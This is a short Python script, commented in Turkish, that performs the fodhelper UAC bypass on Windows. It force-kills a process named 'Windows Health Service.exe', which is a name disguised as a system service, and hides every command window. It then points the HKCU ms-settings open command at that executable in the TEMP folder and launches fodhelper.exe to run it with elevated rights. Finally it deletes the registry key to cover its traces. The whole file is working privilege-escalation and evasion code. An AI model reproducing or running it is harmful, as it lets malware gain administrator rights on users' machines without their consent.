import os
import winreg
import subprocess
import time
import sys

def force_kill_process(process_name):
    """Süreci hem taskkill hem de WMIC ile kapatmaya zorlar."""
    try:
        # 1. Yöntem: Taskkill (Boşluklu isimlere karşı tırnak içinde)
        subprocess.run(
            f'taskkill /F /IM "{process_name}" /T', 
            shell=True, 
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        # 2. Yöntem: WMIC (Taskkill'in yetemediği durumlar için ek önlem)
        # İsmi .exe olmadan da kontrol eder
        clean_name = process_name.replace(".exe", "")
        subprocess.run(
            f'wmic process where "name=\'{process_name}\'" delete', 
            shell=True, 
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        subprocess.run(
            f'wmic process where "name=\'{clean_name}\'" delete', 
            shell=True, 
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        # Kapanması için kısa bir süre bekle
        time.sleep(3)
    except:
        pass

def bypass_uac_and_run():
    target_name = "Windows Health Service.exe"
    
    # 1. ADIM: ESKİ SÜRECİ ÖLDÜR
    force_kill_process(target_name)

    # 2. ADIM: YOLLARI AYARLA
    reg_path = r'Software\Classes\ms-settings\shell\open\command'
    temp_folder = os.environ.get('TEMP')
    full_path = os.path.join(temp_folder, target_name)

    if not os.path.exists(full_path):
        return

    try:
        # 3. ADIM: KAYIT DEFTERİ BYPASS (Fodhelper için)
        winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE) as key:
            # Boşluklu yollar için üç kat tırnak kullanımı Windows için en garantisidir
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, f'"{full_path}"')
            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
        
        # 4. ADIM: TETİKLE
        subprocess.run(
            "fodhelper.exe", 
            shell=True, 
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        # Sistemin dosyayı açması için bekle
        time.sleep(5)

        # 5. ADIM: İZLERİ TEMİZLE
        winreg.DeleteKey(winreg.HKEY_CURRENT_USER, reg_path)

    except:
        pass

if __name__ == "__main__":
    bypass_uac_and_run()
